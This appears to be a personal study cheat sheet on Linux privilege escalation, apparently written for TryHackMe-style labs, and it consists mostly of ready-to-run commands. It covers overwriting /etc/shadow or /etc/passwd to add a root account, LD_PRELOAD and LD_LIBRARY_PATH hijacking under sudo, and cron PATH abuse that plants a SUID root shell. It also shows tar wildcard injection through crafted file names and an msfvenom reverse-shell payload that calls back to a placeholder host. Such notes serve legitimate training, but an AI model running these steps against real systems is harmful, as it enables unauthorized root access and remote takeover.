```
find / -not -type l -perm -o+w -> files with write permissions to all users
find / -not -type l -perm -o+w 2>/dev/null | grep -v "proc"
sudo -l -> files with sudo privileges
find / -perm /4000 2>/dev/null -> check SUID, execute in root of the system
-> ltrace
-> strace
https://gtfobins.github.io/gtfobins/
```
# Service Exploits
Search for installed services run by root and potential exploits for them

# Weak File Permissions
To log to root with password use ssh or `su root` instead of `sudo su`
## Readable /etc/shadow
[[3.5.11 - Dumping hashes]] - Dump and crack hashes
## Writable /etc/shadow
```
openssl passwd -1  -salt abc PASSWORD -> Salted MD5
mkpasswd -m sha-512 newpasswordhere -> SHA-512
```
Replace hash with a new one
## Writable /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
```
Replace x with a hash 
```
openssl passwd newpasswordhere -> MD5
openssl passwd -1  -salt abc PASSWORD -> Salted MD5
mkpasswd -m sha-512 newpasswordhere -> SHA-512

```
Or add a new line
```
newroot:HASH:0:0:root:/root:/bin/bash
```

# Sudo
## Shell Escape Sequences
```
sudo -l
```
Search executables name on https://gtfobins.github.io/
## Environment Variables
```
sudo -l
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
```
Create a shared object 
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
Run one of the programs you are allowed to run as sudo
sudo LD_PRELOAD=/tmp/preload.so program-name
```
OR
```
Find shared libraries used by the program
ldd PROGRAM_ROUTE
Create a shared object called as one of the libraries
gcc -o /tmp/SHARED_LIBRARY -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp program-name
```

# Cron Jobs
## File Permissions
```
cat /etc/crontab

find root cron jobs and change the content of the executed file
```

## PATH Environment Variable
```
cat /etc/crontab

Abused path variable in /etc/crontab to create another script:

#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash

Execute: /tmp/rootbash -p
```

# Wildcards
When tar or other commands use wildcards (\*), can be used to privesc
```
Create a elf with msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf

Transfer file to directory where wildcard is used and make file executable
chmod +x /home/user/shell.elf

Create the following files
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

tar will recognize filenames as tar options, this options are part of sudo privesc using tar: https://gtfobins.github.io/gtfobins/tar/
```

# SUID/SGID
## Known Exploits
Find SUID/SGID files
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Search exploits for files in exploit-db, google, github

MAKE NOTES: https://tryhackme.com/r/room/linuxprivesc

# Kernel exploits
[[3.1.17 - Linux Kernel Exploits]]
